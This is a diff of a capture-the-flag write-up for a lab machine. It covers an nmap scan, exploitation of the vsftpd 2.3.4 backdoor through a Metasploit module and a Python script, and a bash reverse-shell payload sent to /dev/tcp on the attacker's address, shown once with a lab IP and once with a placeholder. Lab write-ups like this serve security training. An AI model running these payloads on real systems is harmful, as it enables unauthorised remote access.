@@ -31,11 +31,11 @@ nmap -T4 -sC -sV -p- 10.10.10.3
 
 Let's check the version of the open services if they are vulnerable.
 
-The 'vsftpd 2.3.4' version seems vulnerable.
+The `vsftpd 2.3.4` version seems vulnerable.
 
 #### Metasploit
 
-We can use the 'exploit/unix/ftp/vsftpd_234_backdoor' module :
+We can use the `exploit/unix/ftp/vsftpd_234_backdoor` module :
 
 ```
 msf> use exploit/unix/ftp/vsftpd_234_backdoor
@@ -62,7 +62,7 @@ ns -lnvp 1234
 We can run the exploit with our reverse shell in parameter :
 
 ```
-python3 vsftpd_234_exploit.py 10.10.10.3 21 'bash -i >& /dev/tcp/10.10.14.31/1234 0>&1'
+python3 vsftpd_234_exploit.py 10.10.10.3 21 'bash -i >& /dev/tcp/<local_ip>/1234 0>&1'
 ```
 
 We get our shell back, anf we are root ! We can get the two flags !
